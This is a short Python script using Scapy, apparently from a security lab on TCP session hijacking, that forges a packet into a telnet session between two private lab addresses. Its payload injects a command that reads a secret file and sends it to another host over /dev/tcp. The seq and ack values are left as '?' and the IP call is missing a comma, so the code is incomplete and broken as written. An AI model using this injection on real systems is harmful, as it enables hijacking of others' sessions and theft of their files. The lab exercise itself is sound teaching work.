import sys
from scapy.all import *

IPLayer = IP(src="10.0.2.15" dst="10.0.2.4")
TCPLayer = TCP(sport=51386, dport=23, flags="A", seq=?, ack=?)
Data = "\r cat /home/seed/secret.txt > /dev/tcp/10.0.2.15/9090\r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt, verbose=0)
